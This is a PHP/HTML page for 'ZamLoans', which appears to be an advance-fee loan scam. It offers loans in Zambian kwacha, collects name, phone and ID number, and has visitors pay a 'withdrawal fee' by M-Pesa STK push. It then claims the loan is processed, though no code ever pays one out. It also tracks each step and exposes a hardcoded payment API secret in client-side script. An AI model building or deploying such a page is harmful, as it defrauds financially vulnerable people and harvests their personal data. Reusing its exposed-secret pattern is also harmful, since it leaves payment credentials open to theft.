<?php
// ZamLoans Application
ob_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
<title>ZamLoans | Quick Zambian Loans</title>
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'DM Sans', sans-serif; background: #f4f6f4; color: #1a1a1a; min-height: 100vh; }

  .page { display: none; }
  .page.active { display: block; }

  .hero-bar {
    background: linear-gradient(135deg, #1a6b3c 0%, #0d3d22 100%);
    padding: 48px 24px 56px;
    text-align: center;
    color: white;
  }
  .hero-bar h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 12px; }
  .hero-bar p  { font-size: 1.05rem; opacity: 0.85; max-width: 520px; margin: 0 auto; line-height: 1.6; }

  .page-hero {
    background: linear-gradient(135deg, #1a6b3c 0%, #0d3d22 100%);
    padding: 28px 24px 56px;
    text-align: center;
    color: white;
  }
  .page-hero h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 6px; }
  .page-hero p  { font-size: 0.9rem; opacity: 0.8; }

  .back-btn {
    display: inline-flex; align-items: center; gap: 6px;
    background: none; border: none; color: rgba(255,255,255,0.85);
    font-family: 'DM Sans', sans-serif; font-size: 0.9rem;
    cursor: pointer; margin-bottom: 16px; padding: 0;
  }
  .back-btn:hover { color: white; }

  .features {
    display: flex; gap: 16px;
    max-width: 900px;
    margin: -36px auto 0;
    padding: 0 24px;
    flex-wrap: wrap;
  }
  .feature-card {
    flex: 1 1 200px; background: white;
    border-radius: 14px; padding: 20px;
    display: flex; align-items: flex-start; gap: 14px;
    box-shadow: 0 2px 12px rgba(0,0,0,0.07);
  }
  .feature-icon {
    width: 42px; height: 42px; border-radius: 10px;
    background: #e8f5ee;
    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
  }
  .feature-icon svg { width: 20px; height: 20px; }
  .feature-card h3 { font-size: 0.95rem; font-weight: 600; margin-bottom: 4px; }
  .feature-card p  { font-size: 0.82rem; color: #666; line-height: 1.4; }

  .loan-section { max-width: 960px; margin: 48px auto; padding: 0 24px; }
  .loan-section h2 { font-size: 1.6rem; font-weight: 700; margin-bottom: 6px; }
  .loan-section > p { color: #666; font-size: 0.9rem; margin-bottom: 28px; }

  .loan-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
    gap: 16px;
  }
  .loan-card {
    background: white; border-radius: 14px; padding: 20px;
    border: 1.5px solid #e0e0e0; cursor: pointer;
    transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s;
  }
  .loan-card:hover { border-color: #1a6b3c; box-shadow: 0 4px 16px rgba(26,107,60,0.1); transform: translateY(-2px); }
  .loan-card.selected { border-color: #1a6b3c; box-shadow: 0 0 0 3px rgba(26,107,60,0.12); }
  .loan-card .label  { font-size: 0.78rem; color: #888; margin-bottom: 6px; }
  .loan-card .amount { font-size: 1.5rem; font-weight: 700; color: #111; margin-bottom: 14px; }
  .loan-card .fee-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
  .loan-card .fee-label { font-size: 0.78rem; color: #888; }
  .loan-card .fee-value { font-size: 0.85rem; font-weight: 600; color: #d97706; }
  .btn-select {
    width: 100%; padding: 10px;
    background: transparent; border: 1.5px solid #ccc;
    border-radius: 10px; font-family: 'DM Sans', sans-serif;
    font-size: 0.88rem; font-weight: 600; cursor: pointer;
    transition: background 0.2s, border-color 0.2s, color 0.2s;
  }
  .btn-select:hover { background: #1a6b3c; border-color: #1a6b3c; color: white; }

  @media (max-width: 600px) {
    .loan-grid {
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
    }
    .loan-card { padding: 14px; border-radius: 12px; }
    .loan-card .amount { font-size: 1.15rem; margin-bottom: 10px; }
    .loan-card .label  { font-size: 0.72rem; margin-bottom: 4px; }
    .loan-card .fee-row { margin-bottom: 12px; }
    .loan-card .fee-label { font-size: 0.72rem; }
    .loan-card .fee-value { font-size: 0.78rem; }
    .btn-select { padding: 8px; font-size: 0.8rem; border-radius: 8px; }
    .loan-section { margin: 32px auto; }
  }

  .card-wrap { max-width: 560px; margin: -32px auto 0; padding: 0 24px 60px; }
  .white-card {
    background: white; border-radius: 16px;
    padding: 32px; box-shadow: 0 2px 16px rgba(0,0,0,0.06);
  }
  .white-card h3 { font-size: 1.1rem; font-weight: 600; margin-bottom: 24px; }

  .field { margin-bottom: 20px; }
  .field label { display: block; font-size: 0.85rem; font-weight: 500; margin-bottom: 7px; color: #333; }
  .field label span { color: #e53e3e; }
  .field input, .field select {
    width: 100%; padding: 12px 14px;
    border: 1.5px solid #e0e0e0; border-radius: 10px;
    font-family: 'DM Sans', sans-serif; font-size: 0.92rem;
    color: #111; outline: none; background: white;
    transition: border-color 0.2s;
  }
  .field input:focus, .field select:focus { border-color: #1a6b3c; }
  .field input::placeholder { color: #aaa; }
  .field select {
    appearance: none;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
    background-repeat: no-repeat; background-position: right 14px center;
  }

  .btn-primary {
    width: 100%; padding: 14px;
    background: #1a6b3c; color: white; border: none;
    border-radius: 12px; font-family: 'DM Sans', sans-serif;
    font-size: 1rem; font-weight: 600; cursor: pointer;
    transition: background 0.2s, transform 0.15s;
    margin-top: 8px;
  }
  .btn-primary:hover { background: #155a31; transform: translateY(-1px); }
  .btn-primary:active { transform: scale(0.98); }
  .btn-primary:disabled { background: #9abfa9; cursor: not-allowed; transform: none; }

  /* Summary box on withdraw page */
  .summary-box {
    background: #f1f5f1; border-radius: 12px;
    overflow: hidden; margin-bottom: 22px;
  }
  .summary-row {
    display: flex; justify-content: space-between; align-items: center;
    padding: 13px 16px; font-size: 0.9rem;
  }
  .summary-row + .summary-row { border-top: 1px solid #e4ebe4; }
  .summary-row .s-label { color: #666; }
  .summary-row .s-val   { font-weight: 600; color: #111; }
  .summary-row .s-val.green { color: #1a6b3c; }

  .pay-info { font-size: 0.88rem; color: #444; margin-bottom: 20px; line-height: 1.6; }
  .pay-info strong { color: #111; }

  .status-msg {
    margin-top: 14px; padding: 12px 14px;
    border-radius: 10px; font-size: 0.84rem; line-height: 1.5;
    display: none;
  }
  .status-msg.show    { display: block; }
  .status-msg.pending { background: #fef9e3; color: #92400e; }
  .status-msg.success { background: #d1fae5; color: #065f46; }
  .status-msg.error   { background: #fee2e2; color: #991b1b; }

  /* Success page */
  .success-icon {
    width: 72px; height: 72px; border-radius: 50%;
    background: #e8f5ee;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 24px;
  }
  .success-icon svg { width: 34px; height: 34px; }
  .text-center { text-align: center; }
  .congrats-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 12px; }
  .congrats-msg   { font-size: 0.92rem; color: #555; line-height: 1.6; margin-bottom: 6px; }
  .congrats-msg strong { color: #111; }
  .congrats-sub   { font-size: 0.88rem; color: #888; margin-bottom: 32px; }

  @media (max-width: 600px) {
    .hero-bar h1 { font-size: 2rem; }
    .features { margin-top: -20px; }
    .card-wrap { margin-top: -20px; }
    .white-card { padding: 22px 18px; }
    .page-hero { padding: 22px 20px 46px; }
  }
</style>
</head>
<body>

<!-- ══ PAGE 1: HOME ══ -->
<div id="page-home" class="page active">
  <div class="hero-bar">
    <h1>ZamLoans</h1>
    <p>Quick Zambian loans with simple fees. Choose your amount, pay the fee, and get funded.</p>
  </div>

  <div class="features">
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#1a6b3c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
        </svg>
      </div>
      <div><h3>Fast Approval</h3><p>Get your loan approved within 24 hours</p></div>
    </div>
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#1a6b3c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        </svg>
      </div>
      <div><h3>Secure Process</h3><p>Your data is protected with encryption</p></div>
    </div>
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#1a6b3c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/>
        </svg>
      </div>
      <div><h3>Low Fees</h3><p>Transparent fees with no hidden charges</p></div>
    </div>
  </div>

  <div class="loan-section">
    <h2>Choose Your Loan</h2>
    <p>Select a loan amount in ZMW. Each loan has a different withdrawal fee.</p>
    <div class="loan-grid" id="loan-grid"></div>
  </div>
</div>

<!-- ══ PAGE 2: APPLICATION FORM ══ -->
<div id="page-apply" class="page">
  <div class="page-hero">
    <button class="back-btn" onclick="goHome()">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg>
      Back to Loans
    </button>
    <h2 id="apply-title">Apply for ZMW 1,000 Loan</h2>
    <p id="apply-fee">Withdrawal Fee: ZMW 200</p>
  </div>

  <div class="card-wrap">
    <div class="white-card">
      <h3>Personal Details</h3>
      <div class="field">
        <label>Full Name <span>*</span></label>
        <input type="text" id="full-name" placeholder="e.g. Mulenga Banda" />
      </div>
      <div class="field">
        <label>Phone Number <span>*</span></label>
        <input type="tel" id="phone" placeholder="e.g. MTN/Safaricom 0971234567" />
      </div>
      <div class="field">
        <label>ID Number <span>*</span></label>
        <input type="text" id="id-number" placeholder="e.g. 12345678" />
      </div>
      <div class="field">
        <label>Type of Loan <span>*</span></label>
        <select id="loan-type">
          <option value="" disabled selected>Select loan type</option>
          <option>Personal Loan</option>
          <option>Business Loan</option>
          <option>Emergency Loan</option>
          <option>Agricultural Loan</option>
        </select>
      </div>
      <button class="btn-primary" onclick="submitApplication()">Submit Application</button>
    </div>
  </div>
</div>

<!-- ══ PAGE 3: WITHDRAW ══ -->
<div id="page-withdraw" class="page">
  <div class="page-hero">
    <button class="back-btn" onclick="showPage('page-apply')">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg>
      Back to Loans
    </button>
    <h2 id="withdraw-title">Apply for ZMW 1,000 Loan</h2>
    <p id="withdraw-fee-hero">Withdrawal Fee: ZMW 200</p>
  </div>

  <div class="card-wrap">
    <div class="white-card">
      <h3>Withdraw Your Loan</h3>

      <div class="summary-box">
        <div class="summary-row">
          <span class="s-label">Loan Amount</span>
          <span class="s-val" id="w-loan-amount">ZMW 1,000</span>
        </div>
        <div class="summary-row">
          <span class="s-label">Withdrawal Fee</span>
          <span class="s-val green" id="w-fee-amount">ZMW 200</span>
        </div>
      </div>

      <p class="pay-info">Pay the withdrawal fee of <strong id="w-fee-inline">ZMW 200</strong> via M-Pesa to release your funds.</p>

      <div class="field">
        <label>M-Pesa Phone Number <span>*</span></label>
        <input type="tel" id="mpesa-phone" placeholder="e.g. 0712345678" />
      </div>

      <button class="btn-primary" id="pay-btn" onclick="onWithdraw()">Pay <span id="pay-btn-label">ZMW 200</span> &amp; Withdraw</button>

      <div class="status-msg" id="paymentStatus"></div>
    </div>
  </div>
</div>

<!-- ══ PAGE 4: SUCCESS ══ -->
<div id="page-success" class="page">
  <div class="page-hero">
    <h2 id="success-title">Apply for ZMW 1,000 Loan</h2>
    <p id="success-fee">Withdrawal Fee: ZMW 200</p>
  </div>

  <div class="card-wrap">
    <div class="white-card text-center">
      <div class="success-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#1a6b3c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"/><polyline points="8 12 11 15 16 9"/>
        </svg>
      </div>
      <p class="congrats-title">Congratulations!</p>
      <p class="congrats-msg">Your loan of <strong id="success-amount">ZMW 1,000</strong> has been processed successfully.</p>
      <p class="congrats-sub">Please proceed to the withdrawal stage to receive your funds.</p>
      <button class="btn-primary" onclick="goHome()">Back to Home</button>
    </div>
  </div>
</div>

<script>
  const NESTLINK_API_SECRET = '2574c18e32d6fc1d49179858';
  const API_BASE = 'https://api.nestlink.co.ke';

  function formatPhone(phone) {
    let c = phone.replace(/\D/g, '');
    if (c.startsWith('0')) c = '254' + c.substring(1);
    else if (c.length === 9 && c.startsWith('7')) c = '254' + c;
    if (!(c.startsWith('254') && c.length === 12)) throw new Error('Use format 07xxxxxxxx or 2547xxxxxxxx');
    if (!c.match(/^2547\d{8}$/)) throw new Error('Enter a valid Safaricom number');
    return c;
  }

  async function sendStkPush(phone, amount, desc) {
    const formatted = formatPhone(phone);
    const local_id = `ZAMLOANS_${Date.now()}_${Math.floor(Math.random()*10000)}`;
    const res = await fetch(`${API_BASE}/runPrompt`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Api-Secret': NESTLINK_API_SECRET },
      body: JSON.stringify({ phone: formatted, amount, local_id, transaction_desc: desc })
    });
    const data = await res.json();
    if (!res.ok || data.status !== true) throw new Error(data.msg || 'STK push failed');
    return data;
  }

  const loans = [
    { amount: 500,   fee: 150  },
    { amount: 1000,  fee: 200  },
    { amount: 1500,  fee: 250  },
    { amount: 2000,  fee: 300  },
    { amount: 2500,  fee: 350  },
    { amount: 3000,  fee: 400  },
    { amount: 3500,  fee: 450  },
    { amount: 3800,  fee: 500  },
    { amount: 4500,  fee: 600  },
    { amount: 5000,  fee: 650  },
    { amount: 6000,  fee: 750  },
    { amount: 7500,  fee: 850  },
    { amount: 10000, fee: 950  },
    { amount: 12000, fee: 1100 },
    { amount: 15000, fee: 1300 },
    { amount: 20000, fee: 1600 },
  ];

  let selectedLoan = null;
  function fmt(n) { return n.toLocaleString(); }

  function renderLoans() {
    const grid = document.getElementById('loan-grid');
    grid.innerHTML = '';
    loans.forEach((loan, i) => {
      const card = document.createElement('div');
      card.className = 'loan-card';
      card.id = 'loan-' + i;
      card.innerHTML = `
        <div class="label">Loan Amount</div>
        <div class="amount">ZMW ${fmt(loan.amount)}</div>
        <div class="fee-row">
          <span class="fee-label">Withdrawal Fee</span>
          <span class="fee-value">ZMW ${fmt(loan.fee)}</span>
        </div>
        <button class="btn-select" onclick="selectLoan(${i})">Select Loan</button>
      `;
      grid.appendChild(card);
    });
  }

  function selectLoan(index) {
    selectedLoan = loans[index];
    document.querySelectorAll('.loan-card').forEach(c => c.classList.remove('selected'));
    document.getElementById('loan-' + index).classList.add('selected');
    document.getElementById('apply-title').textContent = `Apply for ZMW ${fmt(selectedLoan.amount)} Loan`;
    document.getElementById('apply-fee').textContent   = `Withdrawal Fee: ZMW ${fmt(selectedLoan.fee)}`;
    showPage('page-apply');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  function submitApplication() {
    const name  = document.getElementById('full-name').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const id    = document.getElementById('id-number').value.trim();
    const type  = document.getElementById('loan-type').value;
    if (!name || !phone || !id || !type) { alert('Please fill in all required fields.'); return; }

    const a = selectedLoan.amount, f = selectedLoan.fee;
    document.getElementById('withdraw-title').textContent    = `Apply for ZMW ${fmt(a)} Loan`;
    document.getElementById('withdraw-fee-hero').textContent = `Withdrawal Fee: ZMW ${fmt(f)}`;
    document.getElementById('w-loan-amount').textContent     = `ZMW ${fmt(a)}`;
    document.getElementById('w-fee-amount').textContent      = `ZMW ${fmt(f)}`;
    document.getElementById('w-fee-inline').textContent      = `ZMW ${fmt(f)}`;
    document.getElementById('pay-btn-label').textContent     = `ZMW ${fmt(f)}`;
    document.getElementById('mpesa-phone').value = '';
    resetStatus();

    showPage('page-withdraw');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  async function onWithdraw() {
    const phone = document.getElementById('mpesa-phone').value.trim();
    if (!phone) { alert('Please enter your M-Pesa phone number.'); return; }

    const btn = document.getElementById('pay-btn');
    btn.disabled = true;
    btn.textContent = '⏳ Sending M-Pesa request…';
    setStatus('pending', '⏳ Sending STK push to your phone…');

    // Track payment attempt
    track({ action: 'payment_attempt', amount: selectedLoan.amount, fee: selectedLoan.fee, phone, status: 'pending' });

    try {
      await sendStkPush(phone, selectedLoan.fee,
        `ZamLoans - Pay fee ZMW ${fmt(selectedLoan.fee)} to receive ZMW ${fmt(selectedLoan.amount)} loan`);
      setStatus('success',
        `✅ M-Pesa prompt sent! Enter your PIN to pay ZMW ${fmt(selectedLoan.fee)}. Your loan of ZMW ${fmt(selectedLoan.amount)} will be disbursed within 2 hours.`);
      btn.textContent = 'Payment Initiated ✓';

      // Track success
      track({ action: 'payment_result', status: 'success', amount: selectedLoan.amount, fee: selectedLoan.fee });

      setTimeout(() => {
        document.getElementById('success-title').textContent  = `Apply for ZMW ${fmt(selectedLoan.amount)} Loan`;
        document.getElementById('success-fee').textContent    = `Withdrawal Fee: ZMW ${fmt(selectedLoan.fee)}`;
        document.getElementById('success-amount').textContent = `ZMW ${fmt(selectedLoan.amount)}`;
        showPage('page-success');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }, 3000);

    } catch (err) {
      setStatus('error', `❌ ${err.message}`);
      // Track failure
      track({ action: 'payment_result', status: 'error', amount: selectedLoan.amount, fee: selectedLoan.fee });
      btn.disabled = false;
      btn.innerHTML = `Pay <span id="pay-btn-label">Ksh ${fmt(selectedLoan.fee)}</span> &amp; Withdraw`;
    }
  }

  function setStatus(type, msg) {
    const d = document.getElementById('paymentStatus');
    d.className = `status-msg show ${type}`;
    d.textContent = msg;
  }
  function resetStatus() {
    const d = document.getElementById('paymentStatus');
    d.className = 'status-msg';
    d.textContent = '';
  }
  function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
  }
  function goHome() {
    ['full-name','phone','id-number'].forEach(id => document.getElementById(id).value = '');
    document.getElementById('loan-type').value = '';
    showPage('page-home');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // ── TRACKING ──
  function track(payload) {
    fetch('track.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  }

  // Track page visit
  track({ action: 'visit', referrer: document.referrer, page: '/' });

  // Patch selectLoan to track loan clicks
  const _origSelectLoan = selectLoan;
  window.selectLoan = function(index) {
    track({ action: 'loan_click', amount: loans[index].amount, fee: loans[index].fee });
    _origSelectLoan(index);
  };

  renderLoans();
</script>
</body>
</html>
<?php
$html = ob_get_clean();
// Safe minification - only collapse whitespace between HTML tags, not inside JS
$html = preg_replace('/<!--.*?-->/s', '', $html);
$html = preg_replace('/>\s+</', '><', $html);
echo $html;
?>
